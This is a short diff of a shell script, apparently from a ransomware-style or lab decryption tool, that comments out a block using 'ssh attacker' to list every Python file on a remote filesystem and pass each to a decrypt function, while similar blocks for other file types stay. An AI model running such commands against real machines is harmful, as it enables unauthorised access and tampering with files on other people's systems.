@@ -53,13 +53,13 @@ decrypt_file() {
     done
 ) &
 
-# Decrypt all python files
-(
-    output=$(ssh attacker "byossh 'find / | grep .py'")
-    for file in $output; do
-        decrypt_file $file
-    done
-) &
+# # Decrypt all python files
+# (
+#     output=$(ssh attacker "byossh 'find / | grep .py'")
+#     for file in $output; do
+#         decrypt_file $file
+#     done
+# ) &
 
 # Decrypt all go files
 (
